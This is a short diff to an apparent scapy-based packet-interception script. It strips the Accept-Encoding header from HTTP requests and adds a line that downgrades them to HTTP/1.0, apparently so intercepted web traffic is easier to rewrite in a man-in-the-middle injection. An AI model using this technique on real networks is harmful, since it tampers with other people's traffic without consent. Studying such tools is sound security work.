@@ -43,7 +43,8 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].dport == 80:
                 print("[+] HTML Request:")
                 # Modifies the request to not allow encoding for easier changes to be made
-                load = re.sub(r'Accept-Encoding:.*?\r\n', '', load)           
+                load = re.sub(r'Accept-Encoding:.*?\r\n', '', load)  
+                load = load.replace("HTTP/1.1", "HTTP/1.0")         
             # Looks for reseponses on HTML port by looking at source port variable
             elif scapy_packet[scapy.TCP].sport == 80:
                 print('[+] Response:')
